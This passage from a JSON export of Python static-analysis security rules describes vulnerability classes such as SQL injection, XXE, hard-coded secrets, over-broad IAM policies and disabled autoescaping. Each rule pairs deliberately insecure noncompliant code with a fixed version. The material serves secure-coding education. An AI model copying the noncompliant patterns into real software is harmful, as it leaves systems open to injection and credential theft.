it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom graphql_server.flask import GraphQLView\n\napp.add_url_rule(\"/api\",\n    view_func=GraphQLView.as_view(  # Noncompliant\n        name=\"api\",\n        schema=schema,\n    )\n)\n</pre>\n<h4>Compliant solution</h4>\n<p>Make sure that introspection is disabled in production environments. You can use the following code sample as a reference, in conjunction with your\nown methods for distinguishing between production and non-production environments.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom graphql_server.flask import GraphQLView\n\n# Only one of the following needs to be used\nfrom graphql.validation import NoSchemaIntrospectionCustomRule # graphql-core v3\nfrom graphene.validation import DisableIntrospection           # graphene v3\n\n\napp.add_url_rule(\"/api\",\n    view_func=GraphQLView.as_view(\n        name=\"api\",\n        schema=schema,\n        validation_rules=[\n            NoSchemaIntrospectionCustomRule,\n            DisableIntrospection,\n        ]\n    )\n)\n</pre>\n<h3>How does this work?</h3>\n<h4>Disabling introspection</h4>\n<p>The GraphQL server framework should be instructed to disable introspection in production environments. This prevents any attacker attempt to\nretrieve schema information from the server at runtime.</p>\n<p>Each GraphQL framework will have a different method of doing this, possibly including:</p>\n<ul>\n  <li> Changing a simple boolean setting. </li>\n  <li> Adding a middleware module to the request processing chain. </li>\n  <li> Adding a GraphQL validator that rejects introspection keywords. </li>\n</ul>\n<p>If introspection is required, it should only be made available to the smallest possible audience. This could include development environments,\nusers with a specific right, or requests from a specific set of IP addresses.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> OWASP Web Security Testing Guide - <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL#introspection-queries\">Testing GraphQL</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S6781": {
        "name": "JWT secret keys should not be disclosed",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>If a JWT secret key leaks to an unintended audience, it can have serious security implications for the corresponding application. The secret key is\nused to encode and decode JWTs when using a symmetric signing algorithm, and an attacker could potentially use it to perform malicious actions.</p>\n<p>For example, an attacker could use the secret key to create their own authentication tokens that appear to be legitimate, allowing them to bypass\nauthentication and gain access to sensitive data or functionality.</p>\n<p>In the worst-case scenario, an attacker could be able to execute arbitrary code on the application by abusing administrative features, and take\nover its hosting server.</p>\n<h2>How to fix it in Flask</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p>Changing the secret value is sufficient to invalidate any data that it protected.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following noncompliant code contains a hard-coded secret that can be exposed unintentionally.</p>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\nfrom flask import Flask\n\napp = Flask(__name__)\napp.config['JWT_SECRET_KEY'] = secret_key  # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>A solution is to set this secret in an environment string.</p>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\nfrom flask import Flask\nimport os\n\napp = Flask(__name__)\napp.config['JWT_SECRET_KEY'] = os.environ[\"JWT_SECRET_KEY\"]\n</pre>\n<h3>Going the extra mile</h3>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>\n<h3>Documentation</h3>\n<ul>\n  <li> Flask JWT documentation - <a href=\"https://flask-jwt-extended.readthedocs.io/en/stable/options.html#jwt-secret-key\">Config - JWT_SECRET_KEY</a>\n  </li>\n  <li> Python-Jose documentation - <a href=\"https://python-jose.readthedocs.io/en/latest/jwt/index.html\">JSON Web Token</a> </li>\n  <li> PyJWT documentation - <a href=\"https://pyjwt.readthedocs.io/en/stable/api.html\">API Reference</a> </li>\n  <li> Simple JWT documentation - <a href=\"https://django-rest-framework-simplejwt.readthedocs.io/en/latest/settings.html#signing-key\">SIGNING_KEY</a>\n  </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S2077": {
        "name": "Formatting SQL queries is security-sensitive",
        "htmlDesc": "<p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the\nquery. However, this rule doesn’t detect SQL injections (unlike rule <a href='/coding_rules#rule_key=python%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted\nqueries.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some parts of the query come from untrusted values (like user inputs). </li>\n  <li> The query is repeated/duplicated in other parts of the code. </li>\n  <li> The application must support different types of relational databases. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html\">parameterized queries, prepared\n  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>\n  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nfrom django.db import models\nfrom django.db import connection\nfrom django.db import connections\nfrom django.db.models.expressions import RawSQL\n\nvalue = input()\n\n\nclass MyUser(models.Model):\n    name = models.CharField(max_length=200)\n\n\ndef query_my_user(request, params, value):\n    with connection.cursor() as cursor:\n        cursor.execute(\"{0}\".format(value))  # Sensitive\n\n    # https://docs.djangoproject.com/en/2.1/ref/models/expressions/#raw-sql-expressions\n\n    RawSQL(\"select col from %s where mycol = %s and othercol = \" + value, (\"test\",))  # Sensitive\n\n    # https://docs.djangoproject.com/en/2.1/ref/models/querysets/#extra\n\n    MyUser.objects.extra(\n        select={\n            'mycol':  \"select col from sometable here mycol = %s and othercol = \" + value}, # Sensitive\n           select_params=(someparam,),\n        },\n    )\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ncursor = connection.cursor(prepared=True)\nsql_insert_query = \"\"\" select col from sometable here mycol = %s and othercol = %s \"\"\"\n\nselect_tuple = (1, value)\n\ncursor.execute(sql_insert_query, select_tuple) # Compliant, the query is parameterized\nconnection.commit()\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> Derived from FindSecBugs rules <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA\">Potential SQL/JPQL Injection\n  (JPA)</a>, <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO\">Potential SQL/JDOQL Injection (JDO)</a>, <a\n  href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE\">Potential SQL/HQL Injection (Hibernate)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S6317": {
        "name": "AWS IAM policies should limit the scope of permissions given",
        "htmlDesc": "<p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated\nresources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions\nthan expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher\nlevel of access.</p>\n<h2>Why is this an issue?</h2>\n<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy\nwhich, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)\nare called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>\n<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>\"*\"</code> permissions for example.) This is especially\ntrue if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of\npermissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles\nthat have more permissions than they need.</p>\n<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>\n<h3>What is the potential impact?</h3>\n<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be\nable to perform actions beyond their intended scope.</p>\n<h4>Privilege escalation</h4>\n<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be\nable to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>\n<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and\ndelete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to\nexfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe\nconsequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>\n<h2>How to fix it in AWS CDK</h2>\n<h3>Code examples</h3>\n<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by\naltering the code of a Lambda that executes with high privileges.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement\n\nPolicyDocument(\n    statements=[\n        PolicyStatement(\n            effect=Effect.ALLOW,\n            actions=[\"lambda:UpdateFunctionCode\"],\n            resources=[\"*\"]  # Noncompliant\n        )\n    ]\n)\n</pre>\n<h4>Compliant solution</h4>\n<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement\n\nPolicyDocument(\n    statements=[\n        PolicyStatement(\n            effect=Effect.ALLOW,\n            actions=[\"lambda:UpdateFunctionCode\"],\n            resources=[\n                \"arn:aws:lambda:us-east-2:123456789012:function:my-function:1\"\n            ]\n        )\n    ]\n)\n</pre>\n<h3>How does this work?</h3>\n<h4>Principle of least privilege</h4>\n<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted\nenough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>\n<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy\nwith overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.\nIn this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv\">Policies and permissions\n  in IAM: Grant least privilege</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Rhino Security Labs - <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\">AWS IAM Privilege Escalation -\n  Methods and Mitigation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-269 - Improper Privilege Management</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6437": {
        "name": "Credentials should not be hard-coded",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>\n<h4>Financial loss</h4>\n<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of\nclient applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own\nneed, including in a way that was not expected.</p>\n<p>This additional use of the secret will lead to added costs with the service provider.</p>\n<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected\napplication. This might result in a partial denial of service for all the application’s users.</p>\n<h4>Application’s security downgrade</h4>\n<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the\naffected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting\nserver or another linked component.</p>\n<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.\nAn attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Analyze recent secret use</strong></p>\n<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will\nallow determining if an attacker took advantage of the leaked secret and to what extent.</p>\n<p>This operation should be part of a global incident response process.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<p>The following code example is noncompliant because it uses a hardcoded secret value.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom requests_oauthlib.oauth2_session import OAuth2Session\n\nscope = ['https://www.api.example.com/auth/example.data']\n\noauth = OAuth2Session(\n    'example_client_id',\n    redirect_uri='https://callback.example.com/uri',\n    scope=scope)\n\ntoken = oauth.fetch_token(\n        'https://api.example.com/o/oauth2/token',\n        client_secret='example_Password') # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom os import environ\nfrom requests_oauthlib.oauth2_session import OAuth2Session\n\nscope = ['https://www.api.example.com/auth/example.data']\n\noauth = OAuth2Session(\n    'example_client_id',\n    redirect_uri='https://callback.example.com/uri',\n    scope=scope)\n\npassword = environ.get('OAUTH_SECRET')\n\ntoken = oauth.fetch_token(\n        'https://api.example.com/o/oauth2/token',\n        client_secret=password)\n</pre>\n<h3>How does this work?</h3>\n<p>While the noncompliant code example contains a hard-coded password, the compliant solution retrieves the secret’s value from its environment. This\nallows to have an environment-dependent secret value and avoids storing the password in the source code itself.</p>\n<p>Depending on the application and its underlying infrastructure, how the secret gets added to the environment might change.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html\">What is AWS Secrets Manager</a> </li>\n  <li> Azure Documentation - <a href=\"https://learn.microsoft.com/en-us/azure/key-vault/\">Azure Key Vault</a> </li>\n  <li> Google Cloud - <a href=\"https://cloud.google.com/secret-manager/docs\">Secret Manager documentation</a> </li>\n  <li> HashiCorp Developer - <a href=\"https://developer.hashicorp.com/vault/docs\">Vault Documentation</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 - Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 - Category A2 - Broken\n  Authentication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S2755": {
        "name": "XML parsers should not be vulnerable to XXE attacks",
        "htmlDesc": "<p>This vulnerability allows the usage of external entities in XML.</p>\n<h2>Why is this an issue?</h2>\n<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without\nproper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exposing sensitive data</h4>\n<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can\nreference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these\nentities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe\nthreat to the confidentiality of critical information.</p>\n<h4>Exhausting system resources</h4>\n<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,\nattackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading\nto system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>\n<h4>Forging requests</h4>\n<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker\ncan make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as\nretrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,\nincluding unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>\n<h2>How to fix it in Python Standard Library</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nimport xml.sax\n\nparser = xml.sax.make_parser()\nmyHandler = MyHandler()\nparser.setContentHandler(myHandler)\nparser.setFeature(feature_external_ges, True) # Noncompliant\nparser.parse('xxe.xml')\n</pre>\n<h4>Compliant solution</h4>\n<p>The SAX parser does not process general external entities by default since version 3.7.1.</p>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nimport xml.sax\n\nparser = xml.sax.make_parser()\nmyHandler = MyHandler()\nparser.setContentHandler(myHandler)\nparser.setFeature(feature_external_ges, False)\nparser.parse('xxe.xml')\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S6319": {
        "name": "Using unencrypted SageMaker notebook instances is security-sensitive",
        "htmlDesc": "<p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker\ninstances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries\nphysically access the storage media, they cannot decrypt encrypted data.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The instance contains sensitive data that could cause harm when leaked. </li>\n  <li> There are compliance requirements for the service to store data encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by\nSageMaker, so no further modifications to the application are necessary.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_sagemaker/CfnNotebookInstance.html\">aws_cdk.aws_sagemaker.CfnNotebookInstance</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sagemaker as sagemaker\n)\n\nclass CfnSagemakerStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n\n        sagemaker.CfnNotebookInstance(\n            self, \"Sensitive\",\n            instance_type=\"instanceType\",\n            role_arn=\"roleArn\"\n        )  # Sensitive, no KMS key is set by default; thus, encryption is disabled\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_sagemaker/CfnNotebookInstance.html\">aws_cdk.aws_sagemaker.CfnNotebookInstance</a>:</p>\n<pre>\nfrom aws_cdk import (\n    aws_sagemaker as sagemaker,\n    aws_kms as kms\n)\n\nclass CfnSagemakerStack(Stack):\n    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:\n        super().__init__(scope, construct_id, **kwargs)\n\n        my_key = kms.Key(self, \"Key\")\n        sagemaker.CfnNotebookInstance(\n            self, \"Compliant\",\n            instance_type=\"instanceType\",\n            role_arn=\"roleArn\",\n            kms_key_id=my_key.key_id\n        )\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html\">Protect Data at Rest Using Encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "python:S5439": {
        "name": "HTML autoescape mechanism should not be globally disabled",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=python%3AS5247'>S5247</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>Template engines have an HTML autoescape mechanism that protects web applications against most common cross-site-scripting (XSS)\nvulnerabilities.</p>\n<p>By default, it automatically replaces HTML special characters in any template variables. This secure by design configuration should not be globally\ndisabled.</p>\n<p>Escaping HTML from template variables prevents switching into any execution context, like <code>&lt;script&gt;</code>. Disabling autoescaping\nforces developers to manually escape each template variable for the application to be safe. A more pragmatic approach is to escape by default and to\nmanually disable escaping when needed.</p>\n<p>A successful exploitation of a cross-site-scripting vulnerability by an attacker allow him to execute malicious JavaScript code in a user’s web\nbrowser. The most severe XSS attacks involve:</p>\n<ul>\n  <li> Forced redirection </li>\n  <li> Modify presentation of content </li>\n  <li> User accounts takeover after disclosure of sensitive information like session cookies or passwords </li>\n</ul>\n<p>This rule supports the following libraries:</p>\n<ul>\n  <li> <a href=\"https://github.com/django/django\">Django Templates</a> </li>\n  <li> <a href=\"https://github.com/pallets/jinja\">Jinja2</a> </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nfrom jinja2 import Environment\n\nenv = Environment() # Noncompliant; New Jinja2 Environment has autoescape set to false\nenv = Environment(autoescape=False) # Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nfrom jinja2 import Environment\nenv = Environment(autoescape=True) # Compliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md\">OWASP Cheat\n  Sheet</a> - XSS Prevention Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/80\">CWE-80 - Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic\n  XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/81\">CWE-81 - Improper Neutralization of Script in an Error Message Web Page</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/82\">CWE-82 - Improper Neutralization of Script in Attributes of IMG Tags in a Web\n  Page</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/83\">CWE-83 - Improper Neutralization of Script in Attributes in a Web Page</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/84\">CWE-84 - Improper Neutralization of Encoded URI Schemes in a Web Page</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/85\">CWE-85 - Doubled Character XSS Manipulations</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/86\">CWE-86 - Improper Neutralization of Invalid Characters in Identifiers in Web\n  Pages</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/87\">CWE-87 - Improper Neutralization of Alternate XSS Syntax</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "python:S5443": {
        "name": "Using publicly writable directories is security-sensitive",
        "htmlDesc": "<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:\n    <ul>\n      <li> The generated filename is unpredictable </li>\n      <li> The file is readable and writable only by the creating user ID </li>\n      <li> The file 